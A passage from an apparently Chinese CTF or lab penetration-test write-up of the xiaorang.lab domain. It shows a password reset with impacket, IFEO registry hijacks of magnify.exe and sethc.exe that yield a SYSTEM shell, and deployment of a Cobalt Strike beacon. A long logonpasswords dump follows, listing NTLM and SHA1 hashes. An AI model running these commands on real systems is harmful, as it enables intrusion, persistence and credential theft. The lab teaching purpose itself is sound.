alt="img"></p><p><code>STATUS_PASSWORD_EXPIRED</code>提示密码过期了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br></pre></td></tr></table></figure><p>尝试登录，会显示过期，这里我们就可以直接通过图形化去修改密码。然后再次登录会发现31这台登录不成功。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007358.png" alt="img"></p><p>我们还可以使用 smbpasswd进行修改密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q python3 smbpasswd.py xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.46 -newpass &#x27;Mash1r0&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/Lex-Case/Impacket/tree/master">https://github.com/Lex-Case/Impacket/tree/master</a></p><p>尝试发现只有46这台能够成功登录。我们用win去开rdp，用proxifier配置代理即可，我配置rdp软件走代理好像没成功，指定ip走代理可以。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007953.png" alt="img"></p><p>发现权限很低，需要提权。根据前面的提示可以知道IFEO劫持。打开powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-acl</span> <span class="literal">-path</span> <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="built_in">fl</span> *</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007862.png" alt="img"></p><p> 登录到系统的所有用户可以修改注册表的值和创建子项。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007051.png" alt="img"></p><p>操作成功之后锁定，然后点击右下角的放大镜。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008305.png" alt="img"></p><p>也可以参考X1r0z的payload，按五次shift键就行了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008514.png" alt="img"></p><p>成功拿到system权限，在前面flag1相同的目录下面可以找到flag2。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008913.png" alt="img"></p><p>flag2为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;11b351ae-aaac-45d6-95a4-f6ef22bcbdc9&#125;</span><br></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a><strong>flag3</strong></h2><p>经过尝试发现，这台机子好像不出网，用cs上线吧，不然太卡了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141029484.png" alt="image-20250314102239823"></p><p>利用rdp共享磁盘，把前面丢在桌面的cs马传进去。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008651.png" alt="img"></p><p>我们右键之前拿到的shell，创建一个新的监听器用来转发上线。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141030967.png" alt="img"></p><p>然后选择该监听器添加payload。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141030167.png" alt="img"></p><p>得到beacon.exe，c盘需要管理员，我丢在桌面去运行的。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Aldrich</span>\<span class="title">Desktop</span>\<span class="title">beacon.exe</span></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141030127.png" alt="img"></p><p>拿到该shell，利用 logonpasswords  获取凭证。<code>logonpasswords</code> 是 Cobalt Strike 中的一个命令，用于从目标系统中提取登录凭证，包括明文密码、哈希值等。  </p><details class="lake-collapse"><summary id="ub663880a"><span class="ne-text">凭证</span></summary><p id="udc86e5a8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 920067 (00000000:000e0a03)</span></p><p id="u62b3e7d7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : RemoteInteractive from 2</span></p><p id="u3ccb7236" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : Aldrich</span></p><p id="ud2ba829b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : XIAORANG</span></p><p id="u220e77b4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : DC01</span></p><p id="u379f2a6f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:26:05</span></p><p id="uabd4eb04" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-21-3289074908-3315245560-3429321632-1105</span></p><p id="u2d683dd5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">msv :</span></p><p id="u28155898" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> [00000003] Primary</span></p><p id="u8a3151e5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : Aldrich</span></p><p id="u1674ae36" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="u1ddb6e51" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * NTLM     : d62791e860125717d444c4c49b8aaa01</span></p><p id="u2152fc31" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * SHA1     : 3d25b2f82389ff91006d7c8ba3434e81aff39457</span></p><p id="uf4274973" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * DPAPI    : e060f634872ec1e9dab2e6725908e689</span></p><p id="uc64972f8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">tspkg :</span></p><p id="uad098433" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">wdigest :</span></p><p id="u4af91e51" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : Aldrich</span></p><p id="u613ea5ce" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="u32fc9c9a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="u0126a7ee" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">kerberos :</span></p><p id="u6dcccb74" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : Aldrich</span></p><p id="u81c43ed2" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG.LAB</span></p><p id="u8bfdc612" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="uf1f8f8f8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">ssp :</span></p><p id="u6747f2eb" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">credman :</span></p><p id="ua3dba9a7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="ud31a35ee" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 897088 (00000000:000db040)</span></p><p id="udcbee81e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Interactive from 2</span></p><p id="u3be48a35" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : DWM-2</span></p><p id="ubb534498" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : Window Manager</span></p><p id="uc917498a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u90e87861" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:26:05</span></p><p id="u87c9778f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-90-0-2</span></p><p id="ud39f013b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">msv :</span></p><p id="ue222cd6b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> [00000003] Primary</span></p><p id="u2c2abc0c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="u4296e841" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="u505fbf66" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * NTLM     : 83c84a7d3f40516a50f56172f622c38e</span></p><p id="u8424241b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * SHA1     : ac968d62fbbac3b04a453f87d261345268fc6566</span></p><p id="u8b370661" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">tspkg :</span></p><p id="u0ab83055" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">wdigest :</span></p><p id="ucc3b103e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="ud3c4172b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="uadb94fca" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="u062c6bf7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">kerberos :</span></p><p id="u60db5279" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="u73281447" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : xiaorang.lab</span></p><p id="u9147a780" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : 17 21 e4 11 5b 9c 4a 70 2b 9c be 83 c3 7c b3 13 ba 9a f6 15 5e 31 81 ce ae f0 72 94 c3 39 b6 3c 31 34 46 02 34 d0 1a 76 7d bf 40 e5 85 ff 7d 41 b7 9c f3 e4 a2 43 31 a4 64 4b 78 34 08 3a f0 ba 35 c2 57 ea 9e 85 7b d9 dc 15 9c 7a df c1 e3 e9 1d 42 42 04 90 1a 25 96 86 e1 c3 8f b5 46 92 ff 57 cd 3f 40 76 25 fe de b3 f0 4e de d0 34 d6 01 2f 4d 02 50 8a cc da c3 63 7c 6d ab 88 ff 92 59 5e 48 b8 d2 99 3b cd 84 04 47 26 62 c4 99 b8 32 61 aa cf d6 63 7e d6 07 8d ed 31 d4 54 71 24 56 96 ff 7f 86 8f 1e 31 17 5b e3 30 bb 0f ca 61 ff a3 b8 cb 4e 55 9a a9 90 79 2b 6e 2e 77 79 ce f6 ed c7 1a 92 80 ca ae 92 4c 85 e7 9d 78 a4 b1 6a 43 42 34 2f fd 15 dc ac 7f 8b 9f ef 7a ab 77 2e e6 a3 be 70 f3 84 23 be 5c 80 fa 4b 27 80 c3 a5 </span></p><p id="u956313b6" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">ssp :</span></p><p id="uebbe8509" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">credman :</span></p><p id="u41c7370d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="uc88d8152" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 54477 (00000000:0000d4cd)</span></p><p id="ue295715b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Interactive from 1</span></p><p id="u1de4e40e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : DWM-1</span></p><p id="ud9a09811" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : Window Manager</span></p><p id="u9ae45bf6" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u8340a359" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:44</span></p><p id="u908b9db9" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-90-0-1</span></p><p id="ud29d8f72" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">msv :</span></p><p id="u63e5b935" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> [00000003] Primary</span></p><p id="u5abf97dc" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="u4932b4be" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="u334c8a55" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span></p><p id="u9ddbd447" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span></p><p id="ucc2bbddc" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">tspkg :</span></p><p id="uc06af955" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">wdigest :</span></p><p id="u452aee0c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="ue5293eb4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="ue94fe439" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="u600ce69a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">kerberos :</span></p><p id="u32c10f1f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="ue0196147" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : xiaorang.lab</span></p><p id="u9de3bbeb" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 </span></p><p id="u27bf289b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">ssp :</span></p><p id="u0daaa056" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">credman :</span></p><p id="ud8c5fa7b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="udbd7f487" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 996 (00000000:000003e4)</span></p><p id="u50fc0845" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Service from 0</span></p><p id="u35dc0b9a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : WIN2016$</span></p><p id="u352ece8c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : XIAORANG</span></p><p id="ube268837" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u1c933e33" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:44</span></p><p id="u56b12543" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-20</span></p><p id="ubad188a4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">msv :</span></p><p id="u245f8d00" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> [00000003] Primary</span></p><p id="uaedaff23" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="ueae07b2a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="ub7691005" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * NTLM     : 83c84a7d3f40516a50f56172f622c38e</span></p><p id="u243616c7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * SHA1     : ac968d62fbbac3b04a453f87d261345268fc6566</span></p><p id="u9a157f51" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">tspkg :</span></p><p id="u460edcb4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">wdigest :</span></p><p id="uf0458554" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="ue3a17179" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="ucf95eb5c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="u085ed913" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">kerberos :</span></p><p id="u144c6cf9" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : win2016$</span></p><p id="ueb8246d4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG.LAB</span></p><p id="ua862f055" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : 17 21 e4 11 5b 9c 4a 70 2b 9c be 83 c3 7c b3 13 ba 9a f6 15 5e 31 81 ce ae f0 72 94 c3 39 b6 3c 31 34 46 02 34 d0 1a 76 7d bf 40 e5 85 ff 7d 41 b7 9c f3 e4 a2 43 31 a4 64 4b 78 34 08 3a f0 ba 35 c2 57 ea 9e 85 7b d9 dc 15 9c 7a df c1 e3 e9 1d 42 42 04 90 1a 25 96 86 e1 c3 8f b5 46 92 ff 57 cd 3f 40 76 25 fe de b3 f0 4e de d0 34 d6 01 2f 4d 02 50 8a cc da c3 63 7c 6d ab 88 ff 92 59 5e 48 b8 d2 99 3b cd 84 04 47 26 62 c4 99 b8 32 61 aa cf d6 63 7e d6 07 8d ed 31 d4 54 71 24 56 96 ff 7f 86 8f 1e 31 17 5b e3 30 bb 0f ca 61 ff a3 b8 cb 4e 55 9a a9 90 79 2b 6e 2e 77 79 ce f6 ed c7 1a 92 80 ca ae 92 4c 85 e7 9d 78 a4 b1 6a 43 42 34 2f fd 15 dc ac 7f 8b 9f ef 7a ab 77 2e e6 a3 be 70 f3 84 23 be 5c 80 fa 4b 27 80 c3 a5 </span></p><p id="u3041b37d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">ssp :</span></p><p id="u9b49bb3b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">credman :</span></p><p id="u3274ef7b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="u1c9c6bd4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 897105 (00000000:000db051)</span></p><p id="uf92bf35d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Interactive from 2</span></p><p id="uf82980d1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : DWM-2</span></p><p id="ucf42f769" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : Window Manager</span></p><p id="ue48d0822" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u3ec3c3f1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:26:05</span></p><p id="ud109d8c5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-90-0-2</span></p><p id="ub734c455" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">msv :</span></p><p id="u6ac7176f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> [00000003] Primary</span></p><p id="u957b98ff" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="u43fab7f6" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="ud5ef7cf1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span></p><p id="u288a5517" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span></p><p id="u41e76e92" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">tspkg :</span></p><p id="u89b62a35" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">wdigest :</span></p><p id="u85448a22" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="uf889af87" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="u36cdfd52" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="ude711214" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">kerberos :</span></p><p id="u550ff679" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="u613e293b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : xiaorang.lab</span></p><p id="u71bc0361" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 </span></p><p id="uf10f9d64" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">ssp :</span></p><p id="u1c11df01" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">credman :</span></p><p id="u6a7cb8d8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="u9c0f1e47" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 995 (00000000:000003e3)</span></p><p id="u4154c12b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Service from 0</span></p><p id="uc9192dd5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : IUSR</span></p><p id="uaafce0aa" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : NT AUTHORITY</span></p><p id="udc41a33a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="ub17ea022" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:47</span></p><p id="uaccbdb98" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-17</span></p><p id="u71b06155" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">msv :</span></p><p id="u6d5ebf54" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">tspkg :</span></p><p id="u66424e06" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">wdigest :</span></p><p id="u8bb0d857" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : (null)</span></p><p id="u9d75143f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : (null)</span></p><p id="ub9ab92c8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="u339ec6ca" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">kerberos :</span></p><p id="uf5ec1ae8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">ssp :</span></p><p id="u61acce0e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">credman :</span></p><p id="ufb4327b2" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="u3a333849" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 997 (00000000:000003e5)</span></p><p id="ubc7f8ddd" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Service from 0</span></p><p id="u720dd018" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : LOCAL SERVICE</span></p><p id="u9143013f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : NT AUTHORITY</span></p><p id="u38b5040d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u60b33a66" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:44</span></p><p id="u2023a62e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-19</span></p><p id="ueaa957e6" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">msv :</span></p><p id="u5ebb8b30" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">tspkg :</span></p><p id="u9a26f26d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">wdigest :</span></p><p id="u60901a25" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : (null)</span></p><p id="u4cd44246" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : (null)</span></p><p id="ub81ef860" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="u47169f84" class="ne-p" style="margin: 0; padding: 0; min-height: 